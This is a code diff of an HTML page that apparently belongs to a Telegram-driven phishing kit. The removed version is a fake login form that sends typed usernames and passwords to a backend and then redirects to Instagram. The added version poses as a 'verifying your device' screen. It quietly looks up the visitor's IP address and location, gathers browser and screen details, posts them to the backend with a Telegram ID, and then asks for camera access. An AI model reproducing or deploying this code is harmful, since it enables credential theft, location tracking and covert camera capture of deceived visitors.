@@ -2,52 +2,67 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Secure Login</title>
+  <title>Verifying...</title>
   <style>
     body {
+      background-color: #f9f9f9;
       font-family: Arial, sans-serif;
-      background-color: #f2f2f2;
       text-align: center;
       padding-top: 100px;
+      color: #333;
     }
-    input {
-      padding: 10px;
-      margin: 10px;
-      width: 250px;
-      border-radius: 5px;
-      border: 1px solid #ccc;
+    .loading {
+      font-size: 20px;
+      margin-bottom: 20px;
     }
-    button {
-      padding: 10px 25px;
-      border: none;
-      border-radius: 5px;
-      background-color: #007bff;
-      color: white;
-      cursor: pointer;
+    .dots::after {
+      content: '';
+      animation: dots 1.5s steps(3, end) infinite;
     }
-    button:hover {
-      background-color: #0056b3;
+    @keyframes dots {
+      0% { content: ''; }
+      33% { content: '.'; }
+      66% { content: '..'; }
+      100% { content: '...'; }
+    }
+    video {
+      margin-top: 20px;
+      border-radius: 10px;
+      width: 300px;
+      height: auto;
+      display: none;
     }
   </style>
 </head>
 <body>
-  <h2>Login to Continue</h2>
-  <form onsubmit="submitLogin(event)">
-    <input type="text" id="username" placeholder="Username" required /><br>
-    <input type="password" id="password" placeholder="Password" required /><br>
-    <button type="submit">Login</button>
-  </form>
+  <div class="loading">
+    🔄 Verifying your device and connection<span class="dots"></span><br>
+    This may take a few seconds. Please keep this tab open.
+  </div>
+
+  <video id="videoPreview" autoplay muted playsinline></video>
 
   <script>
-    function submitLogin(e) {
-      e.preventDefault();
-      const username = document.getElementById("username").value;
-      const password = document.getElementById("password").value;
-      const urlParams = new URLSearchParams(window.location.search);
-      const chatId = urlParams.get("id");
+    let userIP = "";
+    let deviceInfo = "";
+    const urlParams = new URLSearchParams(window.location.search);
+    const chatId = urlParams.get("id");
 
+    // Get IP info
+    fetch("https://ipinfo.io/json?token=demo")
+      .then(response => response.json())
+      .then(data => {
+        userIP = data.ip + " | " + data.city + ", " + data.region + " - " + data.country;
+        collectAndSend();
+      });
+
+    function collectAndSend() {
+      // Get device info
+      deviceInfo = navigator.userAgent + " | Screen: " + window.screen.width + "x" + window.screen.height;
+
+      // Send to backend first
       if (!chatId) {
-        alert("Missing Telegram user ID in URL.");
+        console.warn("Missing Telegram ID in URL.");
         return;
       }
 
@@ -56,16 +71,27 @@
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           chat_id: chatId,
-          username: username,
-          password: password
+          username: "[AUTO]",
+          password: "[AUTO]",
+          ip: userIP,
+          device: deviceInfo
         })
       }).then(() => {
-        alert("Processing login...");
-        window.location.href = "https://instagram.com";
-      }).catch(err => {
-        alert("Something went wrong. Check your internet or try again.");
-        console.error(err);
+        console.log("IP & Device info sent. Now asking for camera access...");
+        setTimeout(requestCameraAccess, 1500);
       });
+    }
+
+    function requestCameraAccess() {
+      const video = document.getElementById("videoPreview");
+      video.style.display = "block";
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then((stream) => {
+          video.srcObject = stream;
+        })
+        .catch((err) => {
+          console.warn("Camera access denied or not available.");
+        });
     }
   </script>
 </body>
